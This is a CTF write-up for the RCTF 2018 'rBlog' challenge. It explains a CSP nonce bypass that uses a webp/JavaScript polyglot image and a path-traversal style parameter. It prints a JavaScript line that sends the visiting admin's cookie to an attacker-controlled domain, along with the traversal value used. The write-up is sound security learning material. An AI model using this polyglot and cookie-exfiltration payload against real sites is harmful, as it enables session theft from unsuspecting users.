# rBlog 2018

> https://ctftime.org/writeup/10122

Unfortunately I failed to solve this challenge during the contest, but I saw other writeups and no one solved it this way.

In my solution the only important CSP rule is `script-src 'nonce-{nonce}'`, I found HTML injection in blog title, but unfortunately I didn't know how to exploit it.

However we could provide our own image. Moreover we can choose the style for our post, but the server doesn't check if the style is valid and we can send any path of our choice (including our uploaded image). This style is later used as script src with correct nonce! 

If we could find image extension which will be accepted by the server and won't cause Apache to send `Content-Type` header, we can execute arbitrary JS code. Unfortunately here I failed. I tried to upload many file types (including the correct one - webp) but none of them worked.

After the CTF it appeared that I just couldn't use animated .webp file (server response was blank in such case), so I decided to finish this challenge this time with normal webp file. With help of [`imagemin-webp`](https://www.npmjs.com/package/imagemin-webp)  package for Node.JS I created simple webp file (1 black pixel) and the server accepted it. 

To make this file valid JS I needed to put `/*` just after `RIFF`. The field after the header is file length (-8 because of the header), so I had to pad my correct webp file with a lot of "A"s so the total file size will be 10807 and it apperead that it works! After the image data i can put anything as long as file length is correct. So I replaced some first "A"s with 
```js
*/=1;window.location.href="http://[mydomain]/rblog.php?cookie="+document.cookie;/*
``` 
and also put `*/` at the end.

Now the challenge became easy. First we have to create blog post with our image. Then create another blog post, this time we don't need any image, but we must send
`../../../upload/images/{filename}.webp#` as the style path. Visiting the second blog post redirects us successfully to our server, so the last thing we need to do is to report this blog post, wait a few seconds so the admin visits the page and we're done.

Response
```
/rblog.php?cookie=flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d
```

So the flag is: `RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}`